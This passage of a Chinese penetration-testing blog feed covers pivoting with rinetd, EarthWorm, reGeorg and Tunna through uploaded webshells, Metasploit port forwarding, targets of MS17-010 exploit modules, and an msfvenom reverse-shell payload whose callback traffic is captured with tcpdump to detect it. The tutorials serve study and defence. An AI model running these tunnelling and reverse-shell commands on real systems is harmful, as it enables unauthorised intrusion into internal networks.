&lt;h3 id=&quot;配置文件&quot;&gt;配置文件&lt;/h3&gt;

&lt;p&gt;配置文件结构如下：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;源地址&lt;/th&gt;
      &lt;th&gt;源端口&lt;/th&gt;
      &lt;th&gt;目的地址&lt;/th&gt;
      &lt;th&gt;目的端口&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;0.0.0.0&lt;/td&gt;
      &lt;td&gt;8080&lt;/td&gt;
      &lt;td&gt;10.10.12.1&lt;/td&gt;
      &lt;td&gt;8080&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0.0.0.0&lt;/td&gt;
      &lt;td&gt;9090&lt;/td&gt;
      &lt;td&gt;10.10.12.1&lt;/td&gt;
      &lt;td&gt;3389&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0.0.0.0&lt;/td&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;10.10.12.1&lt;/td&gt;
      &lt;td&gt;80&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/rinetd.conf&lt;/code&gt;文件中指定了每条转发记录：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0.0.0.0 8080 10.10.12.1 8080
0.0.0.0 9090 10.10.12.1 3389
0.0.0.0 80   10.10.12.1 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;PS：0.0.0.0表示本机绑定所有可用地址&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;将所有发往B主机的8080端口的请求转发到10.10.12.1的8080端口&lt;/p&gt;

&lt;p&gt;同样的，其他都是一样的意思；&lt;/p&gt;

&lt;h2 id=&quot;0x05-earthworm&quot;&gt;0x05 Earthworm&lt;/h2&gt;

&lt;h3 id=&quot;简介&quot;&gt;简介&lt;/h3&gt;

&lt;p&gt;EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PS：该工具已经集成了lcx的所有功能&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）。&lt;/p&gt;

&lt;p&gt;官网：http://rootkiter.com/EarthWorm/&lt;/p&gt;

&lt;h3 id=&quot;端口转发&quot;&gt;端口转发&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络情况：A无法连接C的端口，但是可以连接B，所以能在B上进行端口转发&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;原理与LCX相同，只是命令参数有所改变：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ew -s lcx_tran -l 1080 -f 10.10.12.1 -g 9999
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将所有发往B主机的1080端口的请求转发到10.10.12.1的9999端口&lt;/p&gt;

&lt;h3 id=&quot;正向-socks-v5-服务器&quot;&gt;正向 SOCKS v5 服务器&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络情况：A无法连接C的端口，但是可以连接B，所以能在B上进行SOCKS代理转发&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ew -s ssocksd -l 1080
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时A主机配置上B主机的socks5服务，即可访问C主机&lt;/p&gt;

&lt;h3 id=&quot;反弹-socks-v5-服务器&quot;&gt;反弹 SOCKS v5 服务器&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络情况：A无法连接C的端口，但是B可以连接A，所以需要B连接A，来创建一个Socks5服务(类似于lcx的反向连接)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;先在一台具有公网 IP 的主机A上运行以下命令：&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ew -s rcsocks -l {A主机Socks服务端口} -e {A主机转发端口} 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的8888端口&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/ew -s rssocks -d {A主机IP地址} -e {A主机端口} 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x06-regeorg&quot;&gt;0x06 reGeorg&lt;/h2&gt;

&lt;h3 id=&quot;简介-1&quot;&gt;简介&lt;/h3&gt;

&lt;p&gt;Git地址：https://github.com/sensepost/reGeorg.git&lt;/p&gt;

&lt;p&gt;reGeorg是一个Python2.7环境下开发的一款结合Webshell进行端口复用的工具，能够将数据通过在本地建立的Socks服务转发到内网环境。&lt;/p&gt;

&lt;p&gt;说明：reGeorg需要配合Webshell使用，并且需要一个良好的网络状况。Python环境必须安装Urlib3&lt;/p&gt;

&lt;h3 id=&quot;创建socks5代理&quot;&gt;创建Socks5代理&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络情况：A只能连接B主机的80端口，A无法与C进行通信，且B无法与外网进行通信&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;首先要选择一个适合目标服务器脚本环境的Webshell脚本，将该脚本上传到服务器上，记录下地址&lt;/p&gt;

&lt;p&gt;在浏览器中访问会出现很熟悉的 Georg says, ‘All seems fine’,说明是正常的&lt;/p&gt;

&lt;p&gt;例如Webshell地址如：http://10.10.18.1/shell.jsp&lt;/p&gt;

&lt;p&gt;进入reGeorg目录，执行&lt;code class=&quot;highlighter-rouge&quot;&gt;python reGeorgSocksProxy.py -u {Webshell地址} -p {本地Socks5服务监听的端口}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;最后会输出&lt;code class=&quot;highlighter-rouge&quot;&gt;Starting socks Server [127.0.0.1:端口]&lt;/code&gt;，此时就可以使用浏览器设置Socks代理访问内网主机的端口了。&lt;/p&gt;

&lt;h2 id=&quot;0x07-metasploit-portfwd&quot;&gt;0x07 Metasploit Portfwd&lt;/h2&gt;

&lt;h3 id=&quot;简介-2&quot;&gt;简介&lt;/h3&gt;

&lt;p&gt;Metasploit中的Portfwd是集成于Metpreter会话中的一个后渗透模块，多用于将内网某个主机的端口转发到本地。&lt;/p&gt;

&lt;h3 id=&quot;内网端口转发&quot;&gt;内网端口转发&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络状况：A已经控制了B主机，但是无法与C主机进行通信&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -L &amp;lt;opt&amp;gt;  转发: 本地监听地址  反向: 本地主机连接到某个地址
    -R        表示正向反向端口
    -h        帮助信息
    -i &amp;lt;opt&amp;gt;  端口转发条目的索引与交互（请参阅“列表”命令）
    -l &amp;lt;opt&amp;gt;  转发：本地端口收听  反向：本地端口连接
    -p &amp;lt;opt&amp;gt;  转发：远程端口连接  反向：远程端口监听
    -r &amp;lt;opt&amp;gt;  转发：连接到远程主机
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;正向转发端口：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;portfwd -L 127.0.0.1 -l 1212 -r 10.10.12.1 -p 3389&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;此时访问本地的1212端口就相当于访问10.10.12.1的3389端口&lt;/p&gt;

&lt;p&gt;反向转发端口：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;portfwd -R -L 10.10.18.1 -l 8080 -r 10.10.12.1 -p 8877&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;此时访问10.10.18.1的8080端口就相当于访问10.10.12.1的8877端口&lt;/p&gt;

&lt;h2 id=&quot;0x08-socat&quot;&gt;0x08 socat&lt;/h2&gt;

&lt;p&gt;参考：http://payloads.online/tools/socat&lt;/p&gt;

&lt;h2 id=&quot;0x09-metasploit-socks4a&quot;&gt;0x09 Metasploit-&amp;gt;socks4a&lt;/h2&gt;

&lt;h3 id=&quot;简介-3&quot;&gt;简介&lt;/h3&gt;

&lt;p&gt;该模块是Metasploit下一个辅助模块，用于在本地创建一个socks4a代理，用于通向Metpreter会话上的主机网络。&lt;/p&gt;

&lt;h3 id=&quot;创建socks4a代理&quot;&gt;创建socks4a代理&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络状况：A已经控制了B主机，但是无法与C主机进行通信&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; use auxiliary/server/socks4a 
msf auxiliary(socks4a) &amp;gt; show options 
Module options (auxiliary/server/socks4a):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.
Auxiliary action:
   Name   Description
   ----   -----------
   Proxy  
msf auxiliary(socks4a) &amp;gt; exploit -y
[*] Auxiliary module execution completed
msf auxiliary(socks4a) &amp;gt; 
[*] Starting the socks4a proxy server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;SRVHOST 是服务端IP地址，默认是本机所有IP&lt;/li&gt;
  &lt;li&gt;SRVPORT 是Socks4a监听端口&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;执行后本地会监听一个1080端口，可以使用浏览器代理、或proxychains-ng等工具代理扫描。&lt;/p&gt;

&lt;h2 id=&quot;0x10-tunna&quot;&gt;0x10 tunna&lt;/h2&gt;

&lt;h3 id=&quot;简介-4&quot;&gt;简介&lt;/h3&gt;

&lt;p&gt;Tunna是一套工具，通过HTTP协议建立一个TCP通信隧道，属于端口复用技术。它可以用来绕过防火墙环境中的网络限制。&lt;/p&gt;

&lt;p&gt;Git：https://github.com/SECFORCE/Tunna&lt;/p&gt;

&lt;h3 id=&quot;端口转发-1&quot;&gt;端口转发&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络状况：A已经拥有了B主机的Webshell，但是无法对B主机的其他端口进行通信&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;该工具的使用方法与reGeorg相似，但是比reGeorg更加稳定、快速、高效。&lt;/p&gt;

&lt;p&gt;例如(1)：&lt;code class=&quot;highlighter-rouge&quot;&gt;python proxy.py -u {WebShell地址} -l 1234 -r 3389 -v -n -s&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;此时，将目标服务器的3389端口转发到本地的1234端口&lt;/p&gt;

&lt;p&gt;例如(2)：&lt;code class=&quot;highlighter-rouge&quot;&gt;python proxy.py -u {WebShell地址} -l 1234 -r 3389 -a 10.10.12.1 -v -n -s&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;此时，将10.10.12.1服务器的3389端口转发到本地的1234端口&lt;/p&gt;

&lt;h2 id=&quot;0x11-结语&quot;&gt;0x11 结语&lt;/h2&gt;

&lt;p&gt;可能这次总结的不算很完善，后期有新的工具再向里面添加。&lt;/p&gt;

</description>
        <pubDate>Fri, 02 Feb 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-02-02/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-02-02/1</guid>
        
        
        <category>内网渗透</category>
        
      </item>
    
      <item>
        <title>Metasploit - MS17010通用模块</title>
        <description>&lt;p&gt;本篇文章主要是演示通用模块的安装及使用。
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x01-ms17010通用模块攻击&quot;&gt;0x01 MS17010通用模块攻击&lt;/h2&gt;

&lt;h3 id=&quot;模块地址&quot;&gt;模块地址&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;https://github.com/RiskSense-Ops/metasploit-framework/blob/6c2d5b1fc23ede746081e82f0843e36609e28731/modules/auxiliary/admin/smb/ms17_010_command.rb&lt;/li&gt;
  &lt;li&gt;https://github.com/RiskSense-Ops/metasploit-framework/blob/6c2d5b1fc23ede746081e82f0843e36609e28731/modules/exploits/windows/smb/ms17_010_psexec.rb&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;模块说明手册&quot;&gt;模块说明手册&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;https://github.com/RiskSense-Ops/metasploit-framework/blob/92915ebb6991ea598582bb25a288b94ecdb654f3/documentation/modules/auxiliary/admin/smb/ms17_010_command.md&lt;/li&gt;
  &lt;li&gt;https://github.com/RiskSense-Ops/metasploit-framework/blob/9b7c19db087e7202f6e5d64ce2f1ab5168e837cf/documentation/modules/auxiliary/admin/smb/ms17_010_psexec.md&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;MS17-010 Windows SMB 远程命令和代码执行模块适用于所有易受到攻击的 目标系统:Windows 2000 到 2016(当然还有家庭版本/工作站)。&lt;/p&gt;

&lt;p&gt;支持系统列表：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Windows 2000 SP0 x86&lt;/li&gt;
  &lt;li&gt;Windows 2000 Professional SP4 x86&lt;/li&gt;
  &lt;li&gt;Windows 2000 Advanced Server SP4 x86&lt;/li&gt;
  &lt;li&gt;Windows XP SP0 x86&lt;/li&gt;
  &lt;li&gt;Windows XP SP1 x86&lt;/li&gt;
  &lt;li&gt;Windows XP SP2 x86&lt;/li&gt;
  &lt;li&gt;Windows XP SP3 x86&lt;/li&gt;
  &lt;li&gt;Windows XP SP2 x64&lt;/li&gt;
  &lt;li&gt;Windows Server 2003 Enterprise SP 2 x86&lt;/li&gt;
  &lt;li&gt;Windows Vista Home Premium x86&lt;/li&gt;
  &lt;li&gt;Windows 7 x86&lt;/li&gt;
  &lt;li&gt;Windows 7 Ultimate SP1 x86&lt;/li&gt;
  &lt;li&gt;Windows 7 Enterprise SP1 x86&lt;/li&gt;
  &lt;li&gt;Windows 7 SP0 x64&lt;/li&gt;
  &lt;li&gt;Windows 7 SP1 x64&lt;/li&gt;
  &lt;li&gt;Windows Server 2008 R2 x64&lt;/li&gt;
  &lt;li&gt;Windows Server 2008 R2 SP1 x64&lt;/li&gt;
  &lt;li&gt;Windows 8 x86&lt;/li&gt;
  &lt;li&gt;Windows 8 x64&lt;/li&gt;
  &lt;li&gt;Windows Server 2012 x64&lt;/li&gt;
  &lt;li&gt;Windows 8.1 Enterprise Evaluation 9600 x86&lt;/li&gt;
  &lt;li&gt;Windows 8.1 SP1 x86&lt;/li&gt;
  &lt;li&gt;Windows 8.1 x64&lt;/li&gt;
  &lt;li&gt;Windows 8.1 SP1 x64&lt;/li&gt;
  &lt;li&gt;Windows Server 2012 R2 x86&lt;/li&gt;
  &lt;li&gt;Windows Server 2012 R2 Standard 9600 x64&lt;/li&gt;
  &lt;li&gt;Windows Server 2012 R2 SP1 x64&lt;/li&gt;
  &lt;li&gt;Windows 10 10.10586 x86&lt;/li&gt;
  &lt;li&gt;Windows 10 10.10586 x64&lt;/li&gt;
  &lt;li&gt;Windows Server 2016 10.10586 x64&lt;/li&gt;
  &lt;li&gt;Windows 10 10.0.14393 x86&lt;/li&gt;
  &lt;li&gt;Windows 10 Enterprise Evaluation 10.14393 x64&lt;/li&gt;
  &lt;li&gt;Windows Server 2016 Data Center 10.14393 x64&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x02-模块安装&quot;&gt;0x02 模块安装&lt;/h2&gt;

</description>
        <pubDate>Thu, 01 Feb 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-02-01/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-02-01/1</guid>
        
        
        <category>内网渗透</category>
        
      </item>
    
      <item>
        <title>从网络扼杀Metasploit木马</title>
        <description>&lt;p&gt;本篇文章主要记录一下自己的网络分析过程，以及总结一下网络分析相关的技术点。
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x01-生成metasploit木马&quot;&gt;0x01 生成Metasploit木马&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=8877 -f exe -o hello.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;基本可以看到，若目标执行&lt;strong&gt;hello.exe&lt;/strong&gt;后会主动连接&lt;strong&gt;10.211.55.2&lt;/strong&gt;的&lt;strong&gt;8877&lt;/strong&gt;端口&lt;/p&gt;

&lt;h3 id=&quot;网络环境&quot;&gt;网络环境：&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;10.211.55.2/255.255.255.0&lt;/li&gt;
  &lt;li&gt;10.211.55.11/255.255.255.0&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x02-获取数据过程&quot;&gt;0x02 获取数据过程&lt;/h2&gt;

&lt;p&gt;首先采用&lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt;这款命令行数据包分析工具：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-a：尝试将网络和广播地址转换成名称；
-c&amp;lt;数据包数目&amp;gt;：收到指定的数据包数目后，就停止进行倾倒操作；
-d：把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出；
-dd：把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出；
-ddd：把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出；
-e：在每列倾倒资料上显示连接层级的文件头；
-f：用数字显示网际网络地址；
-F&amp;lt;表达文件&amp;gt;：指定内含表达方式的文件；
-i&amp;lt;网络界面&amp;gt;：使用指定的网络截面送出数据包；
-l：使用标准输出列的缓冲区；
-n：不把主机的网络地址转换成名字；
-N：不列出域名；
-O：不将数据包编码最佳化；
-p：不让网络界面进入混杂模式；
-q ：快速输出，仅列出少数的传输协议信息；
-r&amp;lt;数据包文件&amp;gt;：从指定的文件读取数据包数据；
-s&amp;lt;数据包大小&amp;gt;：设置每个数据包的大小；
-S：用绝对而非相对数值列出TCP关联数；
-t：在每列倾倒资料上不显示时间戳记；
-tt： 在每列倾倒资料上显示未经格式化的时间戳记；
-T&amp;lt;数据包类型&amp;gt;：强制将表达方式所指定的数据包转译成设置的数据包类型；
-v：详细显示指令执行过程；
-vv：更详细显示指令执行过程；
-x：用十六进制字码列出数据包资料；
-w&amp;lt;数据包文件&amp;gt;：把数据包数据写入指定的文件。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;参考：http://man.linuxde.net/tcpdump&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在&lt;strong&gt;10.211.55.2&lt;/strong&gt;上分析&lt;strong&gt;10.211.55.11&lt;/strong&gt;的连接数据包：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo tcpdump -i vnic0 -vv dst 10.211.55.2 and port 8877&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-25/0x01.png&quot; alt=&quot;开启监听&quot; /&gt;&lt;/p&gt;

&lt;p&gt;msf这边已经开启监听以及抓包分析&lt;/p&gt;

&lt;p&gt;在被控端上执行&lt;strong&gt;hello.exe&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  ~ sudo tcpdump -i vnic0 -vv dst 10.211.55.2 and port 8877
tcpdump: WARNING: vnic0: That device doesn't support promiscuous mode
(BIOCPROMISC: Invalid argument)
tcpdump: listening on vnic0, link-type EN10MB (Ethernet), capture size 262144 bytes
00:50:37.894897 IP (tos 0x0, ttl 128, id 11369, offset 0, flags [DF], proto TCP (6), length 52)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [S], cksum 0x8459 (correct), seq 3700655894, win 8192, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
00:50:37.895086 IP (tos 0x0, ttl 128, id 11370, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x1e7b (correct), seq 3700655895, ack 3460560733, win 256, length 0
00:50:37.926999 IP (tos 0x0, ttl 128, id 11371, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xf68a (correct), seq 0, ack 10225, win 256, length 0
00:50:37.927139 IP (tos 0x0, ttl 128, id 11372, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xbd82 (correct), seq 0, ack 24825, win 256, length 0
00:50:37.927242 IP (tos 0x0, ttl 128, id 11373, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x7912 (correct), seq 0, ack 42345, win 256, length 0
00:50:37.927350 IP (tos 0x0, ttl 128, id 11374, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x293a (correct), seq 0, ack 62785, win 256, length 0
00:50:37.927466 IP (tos 0x0, ttl 128, id 11375, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xcdf9 (correct), seq 0, ack 86145, win 256, length 0
00:50:37.927676 IP (tos 0x0, ttl 128, id 11376, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x6751 (correct), seq 0, ack 112425, win 256, length 0
00:50:37.927862 IP (tos 0x0, ttl 128, id 11377, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xf540 (correct), seq 0, ack 141625, win 256, length 0
00:50:37.928066 IP (tos 0x0, ttl 128, id 11378, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x77c8 (correct), seq 0, ack 173745, win 256, length 0
00:50:37.928178 IP (tos 0x0, ttl 128, id 11379, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x6231 (correct), seq 0, ack 179272, win 256, length 0
00:50:38.323103 IP (tos 0x0, ttl 128, id 11380, offset 0, flags [DF], proto TCP (6), length 463)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0x3b8d (correct), seq 0:423, ack 179843, win 254, length 423
00:50:38.375995 IP (tos 0x0, ttl 128, id 11381, offset 0, flags [DF], proto TCP (6), length 232)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0xbf82 (correct), seq 423:615, ack 179971, win 253, length 192
00:50:38.441008 IP (tos 0x0, ttl 128, id 11382, offset 0, flags [DF], proto TCP (6), length 200)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0x76a7 (correct), seq 615:775, ack 180115, win 253, length 160
00:50:38.589346 IP (tos 0x0, ttl 128, id 11383, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xdc3c (correct), seq 775, ack 212883, win 162, length 0
00:50:38.589354 IP (tos 0x0, ttl 128, id 11384, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xdbde (correct), seq 775, ack 212883, win 256, length 0
00:50:38.589394 IP (tos 0x0, ttl 128, id 11385, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xc50e (correct), seq 775, ack 218723, win 256, length 0
00:50:38.589643 IP (tos 0x0, ttl 128, id 11386, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x19f6 (correct), seq 775, ack 262523, win 256, length 0
00:50:38.589909 IP (tos 0x0, ttl 128, id 11387, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x6375 (correct), seq 775, ack 309243, win 256, length 0
00:50:38.590179 IP (tos 0x0, ttl 128, id 11388, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xc02c (correct), seq 775, ack 351043, win 256, length 0
00:50:38.642138 IP (tos 0x0, ttl 128, id 11389, offset 0, flags [DF], proto TCP (6), length 1500)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0x39a0 (correct), seq 775:2235, ack 351043, win 256, length 1460
00:50:38.642152 IP (tos 0x0, ttl 128, id 11390, offset 0, flags [DF], proto TCP (6), length 1500)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xa2aa (correct), seq 2235:3695, ack 351043, win 256, length 1460
00:50:38.642337 IP (tos 0x0, ttl 128, id 11391, offset 0, flags [DF], proto TCP (6), length 1056)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0x8865 (correct), seq 3695:4711, ack 351043, win 256, length 1016
00:50:38.697005 IP (tos 0x0, ttl 128, id 11392, offset 0, flags [DF], proto TCP (6), length 232)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0x291a (correct), seq 4711:4903, ack 351171, win 256, length 192
00:50:38.747969 IP (tos 0x0, ttl 128, id 11393, offset 0, flags [DF], proto TCP (6), length 328)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0x8f09 (correct), seq 4903:5191, ack 351299, win 255, length 288
00:50:38.800971 IP (tos 0x0, ttl 128, id 11394, offset 0, flags [DF], proto TCP (6), length 760)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0xd0fb (correct), seq 5191:5911, ack 351443, win 255, length 720
00:50:38.854073 IP (tos 0x0, ttl 128, id 11395, offset 0, flags [DF], proto TCP (6), length 936)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0x95e4 (correct), seq 5911:6807, ack 351571, win 254, length 896
00:50:38.927069 IP (tos 0x0, ttl 128, id 11396, offset 0, flags [DF], proto TCP (6), length 200)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [P.], cksum 0xee20 (correct), seq 6807:6967, ack 351699, win 254, length 160
00:50:38.997580 IP (tos 0x0, ttl 128, id 11397, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xf2a8 (correct), seq 6967, ack 397607, win 111, length 0
00:50:38.997587 IP (tos 0x0, ttl 128, id 11398, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xf217 (correct), seq 6967, ack 397607, win 256, length 0
00:50:38.997606 IP (tos 0x0, ttl 128, id 11399, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xd5af (correct), seq 6967, ack 404907, win 228, length 0
00:50:38.997638 IP (tos 0x0, ttl 128, id 11400, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xd593 (correct), seq 6967, ack 404907, win 256, length 0
00:50:38.997728 IP (tos 0x0, ttl 128, id 11401, offset 0, flags [DF], proto TCP (6), length 40)
    windows-7.shared.49324 &amp;gt; 10.211.55.2.8877: Flags [.], cksum 0xb2de (correct), seq 6967, ack 413827, win 221, length 0
